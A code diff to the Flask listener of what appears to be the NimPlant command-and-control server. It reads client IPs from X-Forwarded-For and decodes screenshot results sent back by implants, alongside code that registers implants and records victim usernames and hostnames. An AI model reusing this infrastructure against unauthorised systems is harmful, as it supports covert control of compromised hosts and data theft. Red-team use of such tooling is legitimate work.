@@ -46,6 +46,14 @@ def notifyBadRequest(src, method, path, user_agent, reason=None):
         nimplantPrint(f"Rejected {method} request from '{src}': {path} ({user_agent})")
 
 
+# Define a utility function to easily get the 'real' IP from a request
+def getExternalIp(request):
+    if request.headers.get("X-Forwarded-For"):
+        return request.access_route[0]
+    else:
+        return request.remote_addr
+
+
 # Define Flask listener to run in thread
 def flaskListener(xor_key):
     @app.route(registerPath, methods=["GET", "POST"])
@@ -72,7 +80,7 @@ def flaskListener(xor_key):
                     data = decryptData(data, np.cryptKey)
                     dataJson = json.loads(data)
                     ipAddrInt = dataJson["i"]
-                    ipAddrExt = flask.request.remote_addr
+                    ipAddrExt = getExternalIp(flask.request)
                     username = dataJson["u"]
                     hostname = dataJson["h"]
                     osBuild = dataJson["o"]
@@ -100,7 +108,7 @@ def flaskListener(xor_key):
 
                 except:
                     notifyBadRequest(
-                        flask.request.remote_addr,
+                        getExternalIp(flask.request),
                         flask.request.method,
                         flask.request.path,
                         flask.request.headers.get("User-Agent"),
@@ -109,7 +117,7 @@ def flaskListener(xor_key):
                     return flask.jsonify(status="Not found"), 404
         else:
             notifyBadRequest(
-                flask.request.remote_addr,
+                getExternalIp(flask.request),
                 flask.request.method,
                 flask.request.path,
                 flask.request.headers.get("User-Agent"),
@@ -123,8 +131,8 @@ def flaskListener(xor_key):
         if np is not None:
             if userAgent == flask.request.headers.get("User-Agent"):
                 # Update the external IP address if it changed
-                if not np.ipAddrExt == flask.request.remote_addr:
-                    np.ipAddrExt = flask.request.remote_addr
+                if not np.ipAddrExt == getExternalIp(flask.request):
+                    np.ipAddrExt = getExternalIp(flask.request)
 
                 if np.pendingTasks:
                     # There is a task - check in to update 'last seen' and return the task
@@ -138,7 +146,7 @@ def flaskListener(xor_key):
                     return flask.jsonify(status="OK"), 200
             else:
                 notifyBadRequest(
-                    flask.request.remote_addr,
+                    getExternalIp(flask.request),
                     flask.request.method,
                     flask.request.path,
                     flask.request.headers.get("User-Agent"),
@@ -146,7 +154,7 @@ def flaskListener(xor_key):
                 return flask.jsonify(status="Not found"), 404
         else:
             notifyBadRequest(
-                flask.request.remote_addr,
+                getExternalIp(flask.request),
                 flask.request.method,
                 flask.request.path,
                 flask.request.headers.get("User-Agent"),
@@ -201,7 +209,7 @@ def flaskListener(xor_key):
             else:
                 # Error: The user-agent is incorrect
                 notifyBadRequest(
-                    flask.request.remote_addr,
+                    getExternalIp(flask.request),
                     flask.request.method,
                     flask.request.path,
                     flask.request.headers.get("User-Agent"),
@@ -210,7 +218,7 @@ def flaskListener(xor_key):
         else:
             # Error: No Nimplant with the given GUID is currently active
             notifyBadRequest(
-                flask.request.remote_addr,
+                getExternalIp(flask.request),
                 flask.request.method,
                 flask.request.path,
                 flask.request.headers.get("User-Agent"),
@@ -251,7 +259,7 @@ def flaskListener(xor_key):
                     return flask.jsonify(status="OK"), 200
             else:
                 notifyBadRequest(
-                    flask.request.remote_addr,
+                    getExternalIp(flask.request),
                     flask.request.method,
                     flask.request.path,
                     flask.request.headers.get("User-Agent"),
@@ -259,7 +267,7 @@ def flaskListener(xor_key):
                 return flask.jsonify(status="Not found"), 404
         else:
             notifyBadRequest(
-                flask.request.remote_addr,
+                getExternalIp(flask.request),
                 flask.request.method,
                 flask.request.path,
                 flask.request.headers.get("User-Agent"),
@@ -274,13 +282,17 @@ def flaskListener(xor_key):
         if np is not None:
             if userAgent == flask.request.headers.get("User-Agent"):
                 res = json.loads(decryptData(data["data"], np.cryptKey))
-                np.setTaskResult(
-                    res["guid"], base64.b64decode(res["result"]).decode("utf-8")
-                )
+                data = base64.b64decode(res["result"]).decode("utf-8")
+
+                # Handle Base64-encoded, gzipped PNG file (screenshot)
+                if data.startswith("H4sIAAAA"):
+                    data = processScreenshot(data)
+
+                np.setTaskResult(res["guid"], data)
                 return flask.jsonify(status="OK"), 200
             else:
                 notifyBadRequest(
-                    flask.request.remote_addr,
+                    getExternalIp(flask.request),
                     flask.request.method,
                     flask.request.path,
                     flask.request.headers.get("User-Agent"),
@@ -288,7 +300,7 @@ def flaskListener(xor_key):
                 return flask.jsonify(status="Not found"), 404
         else:
             notifyBadRequest(
-                flask.request.remote_addr,
+                getExternalIp(flask.request),
                 flask.request.method,
                 flask.request.path,
                 flask.request.headers.get("User-Agent"),
@@ -298,7 +310,7 @@ def flaskListener(xor_key):
     @app.errorhandler(Exception)
     def all_exception_handler(error):
         nimplantPrint(
-            f"Rejected {flask.request.method} request from '{flask.request.remote_addr}' to {flask.request.path} due to error: {error}"
+            f"Rejected {flask.request.method} request from '{getExternalIp(flask.request)}' to {flask.request.path} due to error: {error}"
         )
         return flask.jsonify(status="Not found"), 404
 
